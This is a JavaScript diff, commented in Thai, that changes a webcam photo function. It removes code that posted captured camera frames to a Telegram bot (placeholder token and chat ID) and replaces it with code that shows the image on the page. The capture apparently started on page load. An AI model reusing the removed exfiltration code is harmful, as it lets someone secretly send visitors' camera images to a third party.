@@ -20,39 +20,18 @@ function takePhoto() {
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // แปลงรูปเป็น Base64
+    // แปลงภาพเป็น Data URL
     const imageData = canvas.toDataURL('image/png');
 
-    // ส่งรูปไปยัง Telegram
-    sendToTelegram(imageData);
+    // แสดงภาพที่ถ่าย
+    displayPhoto(imageData);
 }
 
-function sendToTelegram(imageData) {
-    const botToken = "YOUR_BOT_TOKEN";  // 🔴 ใส่ Bot Token ของคุณ
-    const chatId = "YOUR_CHAT_ID";      // 🔴 ใส่ Chat ID ของคุณ
-
-    const formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("photo", dataURLtoBlob(imageData));
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: "POST",
-        body: formData
-    })
-    .then(response => response.json())
-    .then(data => console.log("ส่งภาพสำเร็จ:", data))
-    .catch(error => console.error("เกิดข้อผิดพลาด:", error));
-}
-
-function dataURLtoBlob(dataURL) {
-    const parts = dataURL.split(",");
-    const mime = parts[0].match(/:(.*?);/)[1];
-    const byteString = atob(parts[1]);
-    const arrayBuffer = new Uint8Array(byteString.length);
-    for (let i = 0; i < byteString.length; i++) {
-        arrayBuffer[i] = byteString.charCodeAt(i);
-    }
-    return new Blob([arrayBuffer], { type: mime });
+function displayPhoto(imageData) {
+    const img = document.createElement('img');
+    img.src = imageData;
+    img.style.width = "100%"; // ปรับขนาดให้เหมาะสม
+    document.body.appendChild(img); // เพิ่มรูปภาพลงในหน้าเว็บ
 }
 
 // เริ่มทำงานเมื่อหน้าโหลด
